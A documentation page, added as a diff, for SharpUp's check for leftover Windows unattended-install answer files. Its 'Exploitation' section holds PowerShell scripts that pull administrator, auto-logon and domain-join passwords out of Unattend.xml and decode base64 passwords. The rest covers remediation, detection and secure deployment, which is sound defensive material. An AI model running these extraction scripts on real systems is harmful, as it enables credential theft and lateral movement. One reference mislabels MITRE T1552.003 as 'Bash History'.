@@ -1,0 +1,385 @@
+---
+title: 'Unattended Install Files'
+description: 'Credentials in unattended installation answer files'
+icon: 'file'
+---
+
+## Overview
+
+The Unattended Install Files check searches for Windows unattended installation answer files that may contain plaintext or base64-encoded credentials. These files are used during automated Windows deployments and often left behind after installation, accessible to any user on the system.
+
+<Warning>
+Unattended install files can contain local administrator passwords, domain join credentials, and product keys.
+</Warning>
+
+## How It Works
+
+SharpUp checks common locations for unattended installation files:
+
+**File Locations Checked:**
+- `%windir%\sysprep\sysprep.xml`
+- `%windir%\sysprep\sysprep.inf`
+- `%windir%\sysprep.inf`
+- `%windir%\Panther\Unattended.xml`
+- `%windir%\Panther\Unattend.xml`
+- `%windir%\Panther\Unattend\Unattend.xml`
+- `%windir%\Panther\Unattend\Unattended.xml`
+- `%windir%\System32\Sysprep\unattend.xml`
+- `%windir%\System32\Sysprep\Panther\unattend.xml`
+
+## Example Output
+
+```
+=== Unattended Install Files ===
+    C:\Windows\Panther\Unattend.xml
+    C:\Windows\System32\Sysprep\unattend.xml
+```
+
+**Interpretation:**
+- Unattended install files found on system
+- May contain credentials for:
+  - Local administrator account
+  - Domain join account
+  - Auto-logon account
+  - Product keys
+
+## Exploitation
+
+### Method 1: Extract Credentials from XML
+
+```powershell
+# Read and parse unattend.xml
+[xml]$unattend = Get-Content "C:\Windows\Panther\Unattend.xml"
+
+# Extract local administrator password
+$adminPassword = $unattend.unattend.settings.component |
+    Where-Object {$_.name -eq "Microsoft-Windows-Shell-Setup"} |
+    Select-Object -ExpandProperty UserAccounts |
+    Select-Object -ExpandProperty AdministratorPassword |
+    Select-Object -ExpandProperty Value
+
+Write-Host "Administrator Password: $adminPassword"
+
+# Extract auto-logon credentials
+$autoLogon = $unattend.unattend.settings.component |
+    Where-Object {$_.name -eq "Microsoft-Windows-Shell-Setup"} |
+    Select-Object -ExpandProperty AutoLogon
+
+Write-Host "Auto-Logon Username: $($autoLogon.Username)"
+Write-Host "Auto-Logon Password: $($autoLogon.Password.Value)"
+Write-Host "Auto-Logon Domain: $($autoLogon.Domain)"
+```
+
+### Method 2: Extract Domain Join Credentials
+
+```powershell
+[xml]$unattend = Get-Content "C:\Windows\Panther\Unattend.xml"
+
+# Extract domain join credentials
+$domainJoin = $unattend.unattend.settings.component |
+    Where-Object {$_.name -eq "Microsoft-Windows-UnattendedJoin"} |
+    Select-Object -ExpandProperty Identification
+
+$username = $domainJoin.Credentials.Username
+$password = $domainJoin.Credentials.Password
+$domain = $domainJoin.Credentials.Domain
+
+Write-Host "Domain Join Account: $domain\$username"
+Write-Host "Password: $password"
+```
+
+### Method 3: Decode Base64 Passwords
+
+```powershell
+# Some passwords are base64 encoded
+$encodedPassword = "UABhAHMAcwB3AG8AcgBkACEAMQAyADMA"
+
+# Decode
+$decodedPassword = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedPassword))
+
+Write-Host "Decoded Password: $decodedPassword"
+```
+
+### Method 4: Search All Answer Files
+
+```powershell
+# Search for all unattended files with passwords
+$searchPaths = @(
+    "$env:windir\sysprep",
+    "$env:windir\Panther",
+    "$env:windir\System32\Sysprep"
+)
+
+foreach ($path in $searchPaths) {
+    Get-ChildItem -Path $path -Recurse -Include *.xml,*.inf -ErrorAction SilentlyContinue |
+    ForEach-Object {
+        $content = Get-Content $_.FullName -Raw
+        if ($content -match "password|cpassword") {
+            Write-Host "[+] Found: $($_.FullName)"
+            Write-Host $content
+        }
+    }
+}
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Locate Unattended Files">
+    ```powershell
+    # Search for unattended installation files
+    $locations = @(
+        "$env:windir\sysprep\sysprep.xml",
+        "$env:windir\sysprep\sysprep.inf",
+        "$env:windir\sysprep.inf",
+        "$env:windir\Panther\Unattended.xml",
+        "$env:windir\Panther\Unattend.xml",
+        "$env:windir\Panther\Unattend\Unattend.xml",
+        "$env:windir\Panther\Unattend\Unattended.xml",
+        "$env:windir\System32\Sysprep\unattend.xml",
+        "$env:windir\System32\Sysprep\Panther\unattend.xml"
+    )
+
+    $foundFiles = $locations | Where-Object { Test-Path $_ }
+
+    if ($foundFiles) {
+        Write-Host "[!] Found unattended files:"
+        $foundFiles | ForEach-Object { Write-Host "    $_" }
+    }
+    ```
+  </Step>
+
+  <Step title="Review File Contents">
+    Before deletion, review files for credentials that need to be changed:
+
+    ```powershell
+    foreach ($file in $foundFiles) {
+        Write-Host "`n[*] Reviewing: $file"
+        Select-String -Path $file -Pattern "password|username|domain" -Context 2,2
+    }
+    ```
+  </Step>
+
+  <Step title="Delete Unattended Files">
+    ```powershell
+    # Delete unattended installation files
+    foreach ($file in $foundFiles) {
+        if (Test-Path $file) {
+            Remove-Item $file -Force
+            Write-Host "[+] Deleted: $file"
+        }
+    }
+    ```
+  </Step>
+
+  <Step title="Change Exposed Credentials">
+    ```powershell
+    # Change any passwords found in unattended files
+
+    # Local administrator
+    net user Administrator "NewComplexP@ssw0rd123!"
+
+    # Domain accounts (if domain join credentials found)
+    Set-ADAccountPassword -Identity domainJoinAccount -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ssw0rd!" -Force)
+    ```
+  </Step>
+
+  <Step title="Secure Deployment Process">
+    For future deployments:
+
+    - Don't store passwords in answer files
+    - Use offline domain join (djoin.exe)
+    - Implement MDT/SCCM with proper credential management
+    - Delete answer files after successful deployment
+    - Use secure variables instead of plaintext passwords
+  </Step>
+</Steps>
+
+### Automated Cleanup Script
+
+```powershell
+# Deploy via GPO to clean all workstations
+$locations = @(
+    "$env:windir\sysprep\sysprep.xml",
+    "$env:windir\sysprep\sysprep.inf",
+    "$env:windir\sysprep.inf",
+    "$env:windir\Panther\*.xml",
+    "$env:windir\System32\Sysprep\*.xml"
+)
+
+foreach ($pattern in $locations) {
+    Get-Item $pattern -ErrorAction SilentlyContinue | ForEach-Object {
+        $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+
+        if ($content -match "password") {
+            Write-EventLog -LogName Application -Source "Unattend Cleanup" -EventId 1000 -Message "Deleted: $($_.FullName)"
+            Remove-Item $_.FullName -Force
+        }
+    }
+}
+```
+
+## Detection
+
+### Defensive Monitoring
+
+```powershell
+# Monitor access to unattended file directories
+$panther = "$env:windir\Panther"
+
+if (Test-Path $panther) {
+    $acl = Get-Acl $panther
+    $auditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
+        "Everyone",
+        "ReadData",
+        "None",
+        "None",
+        "Success"
+    )
+    $acl.AddAuditRule($auditRule)
+    Set-Acl $panther $acl
+}
+
+# Monitor Event ID 4663 for file access
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4663} |
+Where-Object {$_.Message -match 'Panther|Sysprep' -and $_.Message -match 'xml|inf'}
+```
+
+### Detection Strategies
+
+<Tabs>
+  <Tab title="File Access Monitoring">
+    - Monitor read access to Panther and Sysprep directories
+    - Alert on access to *.xml and *.inf files in these locations
+    - Track which users are accessing these files
+  </Tab>
+
+  <Tab title="Process Monitoring">
+    - Monitor PowerShell access to unattended files
+    - Detect XML parsing of unattended files
+    - Alert on base64 decoding operations
+  </Tab>
+
+  <Tab title="Preventive Scanning">
+    - Regularly scan systems for unattended files
+    - Automate deletion via GPO or SCCM
+    - Alert when files are found
+  </Tab>
+</Tabs>
+
+## Real-World Scenarios
+
+<AccordionGroup>
+  <Accordion title="Scenario 1: Enterprise Deployment Remnants">
+    **Context:** 5,000 workstations deployed using MDT 2 years ago. Unattend.xml files never cleaned up.
+
+    **Contents:**
+    - Local administrator password (same on all workstations)
+    - Domain join service account credentials
+
+    **Impact:**
+    - Attacker compromises one workstation
+    - Finds unattend.xml with local admin password
+    - Gains local admin on all 5,000 workstations
+    - Uses domain join credentials for lateral movement
+
+    **Lesson:** Always clean up deployment artifacts.
+  </Accordion>
+
+  <Accordion title="Scenario 2: Sysprep Answer File">
+    **Context:** Custom Windows image created with Sysprep, answer file included in image.
+
+    **Risk:**
+    - Every deployed system has same answer file
+    - Contains built-in administrator password
+    - Auto-logon configured for initial setup
+
+    **Solution:**
+    - Remove answer files from master image
+    - Use dynamic credential injection
+    - LAPS for local administrator passwords
+  </Accordion>
+
+  <Accordion title="Scenario 3: Penetration Test Discovery">
+    **Context:** Penetration tester gains low-privilege shell on workstation.
+
+    **Attack Path:**
+    1. Run SharpUp to identify unattended files
+    2. Find C:\Windows\Panther\Unattend.xml
+    3. Extract domain join account credentials
+    4. Use credentials to access domain resources
+    5. Escalate to domain admin
+
+    **Prevention:** Regular cleanup and credential rotation.
+  </Accordion>
+</AccordionGroup>
+
+## Prevention Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Clean After Deployment" icon="broom">
+    Always delete answer files after successful Windows installation.
+  </Card>
+  <Card title="Don't Store Passwords" icon="ban">
+    Avoid storing passwords in answer files. Use alternative methods.
+  </Card>
+  <Card title="Use LAPS" icon="key">
+    Implement Local Administrator Password Solution for randomized admin passwords.
+  </Card>
+  <Card title="Offline Domain Join" icon="network-wired">
+    Use djoin.exe for domain joining without storing credentials.
+  </Card>
+</CardGroup>
+
+### Secure Deployment Alternatives
+
+```powershell
+# Offline domain join (no credentials in answer file)
+# On domain controller:
+djoin.exe /provision /domain contoso.com /machine WORKSTATION01 /savefile C:\joindata.txt
+
+# Copy joindata.txt to target system
+# On target workstation:
+djoin.exe /requestODJ /loadfile C:\joindata.txt /windowspath %windir% /localos
+
+# Restart to complete join - no credentials exposed
+```
+
+### MDT/SCCM Best Practices
+
+- Store credentials in variables, not answer files
+- Use separate deployment accounts with limited privileges
+- Rotate deployment account passwords regularly
+- Clean up deployment directories post-installation
+- Audit deployment processes
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Registry AutoLogons" icon="key" href="/ghostpack-docs/SharpUp-mdx/checks/registryautologons">
+    Plaintext auto-logon credentials in registry
+  </Card>
+  <Card title="Cached GPP Password" icon="folder" href="/ghostpack-docs/SharpUp-mdx/checks/cachedgpppassword">
+    Cached Group Policy Preference passwords
+  </Card>
+  <Card title="Domain GPP Password" icon="server" href="/ghostpack-docs/SharpUp-mdx/checks/domaingpppassword">
+    GPP passwords in SYSVOL
+  </Card>
+  <Card title="Remediation Guide" icon="shield" href="/ghostpack-docs/SharpUp-mdx/remediation">
+    Comprehensive remediation guidance
+  </Card>
+</CardGroup>
+
+## References
+
+<CardGroup cols={2}>
+  <Card title="Microsoft Docs" icon="book" href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/automate-windows-setup">
+    Automate Windows Setup
+  </Card>
+  <Card title="MITRE ATT&CK" icon="book" href="https://attack.mitre.org/techniques/T1552/003/">
+    T1552.003 - Unsecured Credentials: Bash History
+  </Card>
+  <Card title="Offline Domain Join" icon="book" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd392267(v=ws.10)">
+    Offline Domain Join (Djoin.exe)
+  </Card>
+</CardGroup>
